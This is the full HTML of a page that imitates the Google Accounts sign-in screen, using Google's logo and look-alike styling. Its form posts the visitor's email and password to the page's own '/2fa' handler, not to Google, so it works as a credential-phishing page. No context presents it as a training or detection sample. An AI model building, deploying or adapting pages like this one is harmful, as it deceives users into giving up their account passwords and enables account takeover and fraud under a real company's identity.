<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
            width: 400px;
        }
        .login-container img {
            height: 40px;
            margin-bottom: 20px;
        }
        .login-container h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }
        .login-container p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 30px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .btn:hover {
            background-color: #1669c1;
        }
        .link {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google">
        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <form action="/2fa" method="post">
            <input type="email" name="email" class="input-field" placeholder="Email or phone" required>
            <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
            <button type="submit" class="btn">Next</button>
        </form>
        <div style="margin-top: 20px;">
            <a href="#" class="link">Forgot email?</a>
            <br><br>
            <a href="#" class="link">Create account</a>
        </div>
    </div>
</body>
</html>
